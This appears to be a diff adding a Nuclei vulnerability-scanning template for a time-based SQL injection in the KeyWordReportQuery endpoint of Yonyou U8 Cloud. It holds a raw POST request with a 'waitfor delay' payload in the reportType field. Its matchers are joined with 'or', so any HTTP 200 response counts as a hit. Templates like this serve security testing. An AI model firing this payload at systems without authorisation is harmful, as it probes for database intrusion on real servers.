@@ -1,0 +1,32 @@
+id: yongyouOA-Cloud-KeyWordReportQuery-sql
+
+info:
+  name: 用友U8 Cloud-KeyWordReportQuery存在SQL注入漏洞
+  author: cnaq
+  severity: high  
+  description: 用友U8 Cloud-KeyWordReportQuery存在SQL注入漏洞
+  reference: 
+    - https://github.com/wy876/POC/blob/main/%E7%94%A8%E5%8F%8BU8%20Cloud-KeyWordReportQuery%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: yongyouOA,sql,injection 
+
+requests:
+  - raw:
+      - |
+        POST /service/~iufo/nc.itf.iufo.mobilereport.data.KeyWordReportQuery HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+        Content-Type: application/x-www-form-urlencoded
+        Content-Length: 0
+
+        {"reportType":"1';waitfor delay '0:0:5'-- ","pageInfo":{"currentPageIndex":1,"pageSize":1},"keyword":[]}
+
+    matchers-condition: or
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl # DSL匹配
+        dsl:
+          - 'duration>=5'
+          - 'duration<8' # 漏洞持续时间大于5秒，小于8秒
+        condition: and # 将默认的 or 的关系改为 and
